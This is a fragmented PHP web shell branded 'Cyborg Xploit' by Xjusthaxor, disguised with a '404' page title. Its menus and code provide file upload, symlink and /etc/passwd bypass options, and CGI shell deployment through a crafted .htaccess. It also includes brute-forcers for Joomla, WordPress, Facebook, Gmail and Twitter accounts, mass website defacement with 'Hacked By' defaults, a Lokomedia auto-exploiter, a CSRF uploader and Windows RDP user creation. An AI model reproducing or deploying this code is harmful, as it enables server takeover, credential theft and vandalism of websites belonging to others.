...
<html>
<head>
	<link rel="SHORTCUT ICON" href="https://telegra.ph/file/4b6810f8797d17460a869.png">
<title>404</title>
<style type="text/css">
html {
	background: #000000;
...
<center><div id="contenttengah"><center>
		<img title="test"src="https://telegra.ph/file/4b6810f8797d17460a869.png" width="70%"></div> </center>


<span class="style4"> Shell Programmer: <br>Xjusthaxor</span><br><br>
<span class="style4">Xjusthaxor: <br>Cyborg Xploit</span><br><br>
<span class="style4">Official Member: <br>Xjusthaxor </span><br><br>
<span class="style4">Greetz : <br> Indonesian Rulez </span>
</div></div></div></td>
</div>
...
<font color = "red" face = "Iceland" size = "6">Xjusthaxor Bypass</font><br><br><br>
...
<font color="#FFF000"> Users Found : <font color = 'red'>root@Xjusthaxor:~$ . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .</font></font><br>
<font color="lime"> Connecting To Our Master ^_^  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .</font><br>
<font color="#F00000"><font color="#FFF000">root@Xjusthaxor:~$</font> Connected ! </font><br>
...
<font color="red">root@Xjusthaxor:~$ </font><font color="#FFF000"><?php echo "@". $ServerName ?><br></font><font color="red">Ready To Fuck Server :p</font>
</tr>
</tbody></table>
<br>
...
<head>
	<link rel="SHORTCUT ICON" href="https://telegra.ph/file/4b6810f8797d17460a869.png">
<title>404</title>
<meta name='author' content='Xjusthaxor'>
<meta charset="UTF-8">
<style type='text/css'>
@import url(http://fonts.googleapis.com/css?family=Iceland);
...
echo "<center>";
echo "<br>";
echo "<img src = 'https://telegra.ph/file/4b6810f8797d17460a869.png' width = '105' height = '105' id='spinner'></img>";
echo "&emsp;&emsp;&emsp;";
echo "<font size='20px' color='red' face = 'Rajdhani'>..: $ Cyborg Xploit $ :.. </font>";
echo "&emsp;";
echo "<img src = 'https://telegra.ph/file/4b6810f8797d17460a869.png' width = '105' height = '105' id='spinner'></img>";
echo "<br><br>";
if($_POST['upload']) {
...
echo "<li> <a href='?dir=$dir&do=symlink'>Sym</a></li>";
echo "<li> <a href='?dir=$dir&do=symlink2'>Sym V.2</a> </li>";
...
echo "<li> <a href='?dir=$dir&do=jbrute'>Bf Joomla</a></li>";
echo "<li> <a href='?dir=$dir&do=wpbrute'>Bf Wordpress</a></li>";
echo "<li> <a href='?dir=$dir&do=fb'>Bf Facebook</a></li>";
echo "<li> <a href='?dir=$dir&do=emailbrute'>Bf Email</a></li>";
echo "<li> <a href='?dir=$dir&do=twitterbf'>Bf Twitter</a></li><br><br>";
...
echo "<li> <a href='?dir=$dir&do=passwbypass'>Bypass Etc</a> </li>";
...
//Fungsi log dinonaktifkan oleh Xjusthaxor
/*
$ch = curl_init();
...
<center/><br/><b><font color=white>-=[ Command  Bypass Exploit  By Xjusthaxor ]=-</font></b><br>
<?php
print_r('
<pre>
...
<center><p align="center" dir="ltr"><b><font size="5" face="Tahoma">+--=[ Bypass CloudFlare By Xjusthaxor ]=--+
</font></b></p>
...
function randomt() {
    ...
    */
    ...
    <center><br><br>
    <font color="white" size='+3'><b>+--=[ Automatic Joomla Index Changer By Xjusthaxor ]=--+</b></font><br><br>
    </center>
    <center><b>
...
<form action="?dir=<?php echo $pwd; ?>&amp;do=jbrute" method="post">
    ...
    <meta name="description" content="Xjusthaxor" />
<center>
</br></br>
<center><b><font color="lime">+--=[ Joomla Brute Force By Xjusthaxor ]=--+</font></b><br /><br />
...
<center>
<br><Br><b><font size='2' >+--=[ Wordpress Brute Force  By Xjusthaxor ]=--+</font><br>
...
?>
	...
	<br><br><center><b><font size=4>+--=[ Facebook BruteForce by Xjusthaxor ]=--+</font></b></center><br><br>
	<?php
ob_start();
@set_time_limit(0);
...
echo "<p align='center' dir='ltr'><font face='Arial Black' size='2'>This Password Seems Working !Try It ^_^ by Xjusthaxor|| Username: <font color='green'>$user</font>&nbsp; Password : <font color='green'>$pass</font></font></p>";
}
}            
...
<br>
<br>
<center><p><b><font size='2' face='Trebuchet MS' color='#FFFFFF'>Published by : Xjusthaxor<br><font size='2' face='Trebuchet MS' color='#FFFFFF'>Coded by : Xjusthaxor</font></b></p></center>";
}
...
?>
	...
	<br><br><center><b><font size=4>+--=[ Gmail BruteForce by Xjusthaxor ]=--+</font></b></center><br>
	<center><span style="font-size:30px; font-family:Fredericka the Great; color:#1975FF">Gmail & Hotmail BruteForce Xjusthaxor</span><center><br>
	<?php
   set_time_limit(0); 
error_reporting(0); 
...
echo"</textarea><br>ID: <input type='text' name='id' value='1'><br>TITLE :<input type='text' name='title' value='Hacked By Xjusthaxor'><br>POST CONTENT: <input type='text' name='content' value='Hacked By Xjusthaxor'><br>POSTNAME: <input type='text' name='postname' value='HackeD By Xjusthaxor'><br>
...
if($_POST['edittitle']) {
	...
	$cgi_dir = mkdir('ia_cgi', 0755);
        chdir('ia_cgi');
	$file_cgi = "cgipy.Xjusthaxor";
        $memeg = ".htaccess";
	$isi_htcgi = "OPTIONS Indexes Includes ExecCGI FollowSymLinks \n AddType application/x-httpd-cgi .Index_Xjusthaxor \n AddHandler cgi-script .Index_Xjusthaxor \n AddHandler cgi-script .Index_Xjustaxor";
	...
	chmod($file_cgi, 0755);
        chmod($memeg, 0755);
	echo "<br><center>Done ... <a href='ia_cgi/cgipy.Xjusthaxor' target='_blank'>Klik Here</a>";
}
...
elseif($_GET['do'] == 'cgi') {
	$cgi_dir = mkdir('ia_cgi', 0755);
        chdir('ia_cgi');
	$file_cgi = "cgi.Xjusthaxor";
        $memeg = ".htaccess";
	$isi_htcgi = "OPTIONS Indexes Includes ExecCGI FollowSymLinks \n AddType application/x-httpd-cgi .Xjusthaxor \n AddHandler cgi-script .Xjusthaxor \n AddHandler cgi-script .Xjusthaxor";
	$htcgi = fopen(".htaccess", "w");
	...
	chmod($file_cgi, 0755);
        chmod($memeg, 0755);
	echo "<br><center>Done ... <a href='ia_cgi/cgi.Xjusthaxor' target='_blank'>Klik Here</a>";
...
elseif($_GET['do'] == 'cgi2') {
	...
	chmod($file_cgi, 0755);
        chmod($memeg, 0755);
	echo "<br><center>Done ... <a href='ia_cgi/cgi2.Xjusthaxor' target='_blank'>Klik Here</a>";
} 
	...
	foreach($domain as $url) {
		foreach($up as $user => $pass) {
			...
			if(preg_match("/Logout|Administrator/", $login)) {
				...
				$data2 = array(
					"judul" => "Xjusthaxor Shell auto exploiter lokomedia",
					"fupload" => "@$file",
					"upload" => " &nbsp;&nbsp;&nbsp;&nbsp; Simpan &nbsp;&nbsp;&nbsp;&nbsp;",
					);
...
echo '<form action="?dir=$dir&do=logout" method="post">';
    ...
    echo '<center>Hanyalah bocah yang ingin terbebas dari tekanan :)</center>';
} elseif($_GET['do'] == 'contact') {
	echo "<center><br><font size='4'>--=[ Contact Me: +62Xxx ]=--</font><br><br>
...
if($_POST['username'] and $_POST['password']){
        ...
        echo "<p align='center' dir='ltr'><font size='2'>Coded By : Xjusthaxor, &amp; Recoded by Xjusthaxor</font></p>";

} elseif($_GET['do'] == 'csrfup')
{	
echo '<html>
<center><h1 style="font-size:33px;">CSRF Exploiter By IndoXPloit<br>Recoded by Xjusthaxor</h1><br><br>
...
<INPUT class=inputzbut type=submit value=setting name=send>
	...
	elseif($_POST['mass'] == 'massdeface') {
		...
		<textarea name='script' style='width: 450px; height: 200px;'>Hacked By Xjusthaxor</textarea><br>
...
echo "<center><form method='post'>
		<u>Defacer</u>: <br>
		<input type='text' name='hekel' size='50' value='Xjusthaxor'><br>
		<u>Team</u>: <br>
		<input type='text' name='tim' size='50' value=' Xjusthaxor'><br>
		<u>Domains</u>: <br>
...
<?php
	...
	if($_POST['hajar']) {
		...
		Set User & Pass: <br>
		<input type='text' name='user_baru' value='Xjusthaxor' placeholder='user_baru'><br>
		<input type='text' name='pass_baru' value='Xjusthaxor' placeholder='pass_baru'><br>
	...
	if($_POST['hajar']) {
		...
		<input type='text' size='50' name='config_dir' value='$dir'><br><br>
		Set Title: <br>
		<input type='text' name='new_title' value='Hacked by Xjusthaxor' placeholder='New Title'><br><br>
	...
	if($_POST['submit']) {
		...
		echo "<center><form method='post'>
		<u>Defacer</u>: <br>
		<input type='text' name='nick' size='50' value='Xjusthaxor'><br>
		<u>Domains</u>: <br>
...
echo "</center></table>";   
	...
	if($_POST['auto_deface_wp']) {
		...
		<input type='text' name='script' height='10' size='50' placeholder='Hacked by Xjusthaxor' required><br>
...
";
	...
	if(strtolower(substr(PHP_OS, 0, 3)) === 'win') {
		if($_POST['create']) {
			...
			if($_POST['opsi'] == '1') {
				...
				$cek = exe("net user $user Xjusthaxor");
				if(preg_match("/$user/", exe("net user"))) {
					echo "[change password: <font color=lime>Xjusthaxor</font>] -> ";
					if($cek) {
						echo "<font color=lime>Berhasil</font>";
					} else {
						echo "<font color=red>Gagal</font>";
			...
			echo "-- Create RDP --<br>
			<form method='post'>
			<input type='text' name='user' placeholder='username' value='Xjusthaxor' required>
			<input type='text' name='pass' placeholder='password' value='Xjusthaxor' required>
			<input type='submit' name='create' value='>>'>
			</form>
			-- Option --<br>
			<form method='post'>
 ...
 elseif($_GET['act'] == 'rename_dir') {
	...
	echo "<center>Copyright &copy; ".date("Y")." <br><font color='red'>Masa Depanmu Adalah Kematian, ~xjusthaxor</font></center>";
	}
?> 
<br><br>
</html>
